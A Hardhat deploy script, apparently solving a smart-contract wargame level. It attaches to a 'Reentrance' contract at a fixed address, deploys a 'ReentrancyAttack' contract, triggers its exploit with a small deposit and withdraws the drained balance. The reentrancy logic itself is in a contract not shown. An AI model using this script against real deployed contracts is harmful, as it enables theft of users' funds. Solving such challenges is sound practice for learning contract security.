import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { Reentrance__factory,ReentrancyAttack__factory } from '../../typechain-types';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const reentranceAddress = "0x2Abb699e762068EA77F94cB5e96b7ab7f2D9709d";

    console.log("Attach Reentrance Contract");
    const Reentrance = await ethers.getContractFactory("Reentrance",(await ethers.getSigners())[0]) as Reentrance__factory;
    const reentrance = Reentrance.attach(reentranceAddress);
    
    console.log("Deploy ReentranceAttack Contract");
    const ReentranceAttack = await ethers.getContractFactory("ReentrancyAttack",(await ethers.getSigners())[0]) as ReentrancyAttack__factory;
    const reentranceAttack = await ReentranceAttack.deploy(reentranceAddress);
    await reentranceAttack.deployed();
    console.log("owner in the reentrance ballamce:",await reentrance.balanceOf(await(await ethers.getSigners())[0].getAddress()));
    const exploit =await reentranceAttack.exploit({value:ethers.utils.parseEther("0.0001")})
    await exploit.wait();
    console.log("owner in the reentrance ballamce:",await reentrance.balanceOf(await(await ethers.getSigners())[0].getAddress()));
    console.log("owner in the reentranceAttrack blance:", await ethers.provider.getBalance(reentranceAttack.address))
    const withdraw = await reentranceAttack.withdraw();
    await withdraw.wait();
    console.log("owner in the reentranceAttrack blance:", await ethers.provider.getBalance(reentranceAttack.address))
}

export default func;
func.tags = ['Reentrance'];